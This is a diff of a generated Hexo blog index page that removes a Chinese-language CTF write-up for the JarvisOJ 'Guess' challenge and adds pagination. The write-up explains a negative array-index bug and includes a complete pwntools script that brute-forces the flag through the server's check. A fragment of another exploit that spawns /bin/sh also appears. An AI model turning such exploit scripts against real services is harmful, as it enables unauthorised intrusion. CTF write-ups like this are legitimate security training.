class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/25/jarvisOj_guess/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="ama2in9">
-      <meta itemprop="description" content="Talking is cheap, show me the code.">
-      <meta itemprop="image" content="/images/head.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ama2in9">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/25/jarvisOj_guess/" itemprop="url">
-                  javisOj->Guess
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2018-11-25 16:38:24" itemprop="dateCreated datePublished" datetime="2018-11-25T16:38:24+08:00">2018-11-25</time>
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/jarvisOj/" itemprop="url" rel="index"><span itemprop="name">jarvisOj</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2018/11/25/jarvisOj_guess/#comments" itemprop="discussionUrl">
-                
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2018/11/25/jarvisOj_guess/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2018/11/25/jarvisOj_guess/" class="leancloud_visitors" data-flag-title="javisOj->Guess">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">Views: </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="jarvis-gt-guess"><a href="#jarvis-gt-guess" class="headerlink" title="jarvis-&gt;guess"></a>jarvis-&gt;guess</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末摸鱼，看做出来的人数以为好做，结果GG，感觉这个题有点像以前看过的一道crypto，总结一下好了</p>
-<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>下载下来的文件是用来本地测试的，开了socket，监听9999端口，其实就是模拟服务器跑的程序，所以本地通信建一个socket就好。重点是is_flag_correct()函数，是一个验证用户输入的函数，所以这个看起来更像一个逆向题。</p>
-<p>调用这个函数前有一个fgets(inbuf,0x1000,stdin)，如果长度这么长，那么在flag_hexa = flag_hex的时候构造一个100*’A’+’\x00’即可绕过长度检查，造成溢出，不过这个测试之后发现好像没什么用，fuzz没什么异常，继续看函数，里面check flag是通过跟一个预存在栈上的flag数组对比确定的，但是是通过bin_by_hex这个数组做了一次映射确定，而这个数组初始化又是由0x401100LL地址上的数据完成的，有趣的是这个数组的0x30处正是0，其ascii码也是0x30，同理A-F的ascii码对应其数组的索引。因此这个比较只需要用户按顺序输入flag即可，这个比较当然不如直接让用户输入和flag对比来的快，所以这里面一定有什么设计。</p>
-<p><img src="/2018/11/25/jarvisOj_guess/1.jpg" alt="code"><br><img src="/2018/11/25/jarvisOj_guess/2.jpg" alt="code2"><br><img src="/2018/11/25/jarvisOj_guess/3.jpg" alt="bin_by_hex"></p>
-<h2 id="程序漏洞"><a href="#程序漏洞" class="headerlink" title="程序漏洞"></a>程序漏洞</h2><p>漏洞就出现在数组索引的检查，数组其实就是一个字符串指针，array[i]等同于*(array+i)，所以当i为负数时，其得到的数据是字符串指针低地址处的数据，这里的flag位置是ebp-0x150，bin_hex_index的位置在ebp-0x110，因此bin_hex_index[-0x40]即flag[0]，想要验证成功，只需value1 = 0,value2 = flag[i]。flag[i] = bin_hex_index[-0x40+i]，即用户输入chr(-0x40+i)，但是注意chr()范围是0-256，因此-0x40+i需要+0x100(模100类似格式化字符串以前的知识)，最终构造出一个完美验证通过的payload。<br>仅仅通过验证不是目的，我们还得知道真正的flag是什么，这里因为我们已经通过payload通过了验证，那么现在只需要修改Payload的第一、二字节，使其为ascii(20-127)，重复验证，一旦得到通过即可确定第一个字节，后面的也同理，两个字节两个字节的确定，直到所有payload都被替换成真正的flag</p>
-<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"error"</span>)</span><br><span class="line">sh = remote(<span class="string">'pwn.jarvisoj.com'</span>,<span class="number">9878</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span><span class="params">(data)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'guess&gt; '</span>)</span><br><span class="line">    sh.sendline(data)</span><br><span class="line">    response = sh.recvline().strip(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> response == <span class="string">'Nope.'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">init_payload = <span class="string">''</span></span><br><span class="line">offset = <span class="number">0x100</span><span class="number">-0x40</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        init_payload += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        init_payload += chr(offset + (i<span class="number">-1</span>)/<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> len(init_payload)</span><br><span class="line"><span class="comment">#init_payload = "504354467b3439643433313061313038353837353536373933323635316535353965313533636663386264323762340" + init_payload[95:]</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>,<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">20</span>,<span class="number">128</span>):</span><br><span class="line">            temp = hex(j)[<span class="number">2</span>:]</span><br><span class="line">            init_payload = init_payload[:i] + temp.ljust(<span class="number">2</span>,<span class="string">'0'</span>) + init_payload[i+<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">if</span> guess(init_payload) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span> str(i)+<span class="string">':'</span>+init_payload</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> init_payload</span><br><span class="line">flag = init_payload.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
-<p>中间recv会报timeout，可以修改for循环start，断点验证，之后hex_encode即可</p>
-<h2 id="编外"><a href="#编外" class="headerlink" title="编外"></a>编外</h2><p>看别人的wp有说patch改掉alarm然后方便调试的，这里也记录一下吧，虽然自己没调试</p>
-<p>找到call _alarm位置，option-&gt;general,number of opcode bytes改为8<br>选中mov edi,78h call _alarm,打开Edit-&gt;Patch Program-&gt;change bytes<br>最后Edit-&gt;Patch Program-&gt;Apply patches to input file</p>
-<p><img src="/2018/11/25/jarvisOj_guess/5.jpg" alt="patch"><br><img src="/2018/11/25/jarvisOj_guess/6.jpg" alt="res"></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+  </nav>
+
 
 
           </div>
@@ -2233,7 +2245,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">10</span>
+                    <span class="site-state-item-count">12</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -2260,7 +2272,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">7</span>
+                      
+                    
+                    <span class="site-state-item-count">8</span>
                     <span class="site-state-item-name">categories</span>
                   </a>
                 </div>
